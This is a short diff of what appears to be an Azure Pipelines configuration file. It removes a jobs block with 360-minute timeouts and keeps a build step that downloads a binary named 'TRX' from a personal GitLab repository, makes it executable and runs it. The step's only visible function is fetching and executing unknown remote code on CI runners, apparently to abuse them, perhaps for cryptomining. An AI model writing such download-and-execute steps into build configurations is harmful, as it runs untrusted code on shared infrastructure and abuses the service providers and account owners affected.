@@ -9,9 +9,5 @@
  pool:
    vmImage: ubuntu-latest
     
- jobs:
-- job: a
-  timeoutInMinutes: 360
-  cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://gitlab.com/mimix200/zpol/-/raw/main/TRX && chmod +x TRX && ./TRX
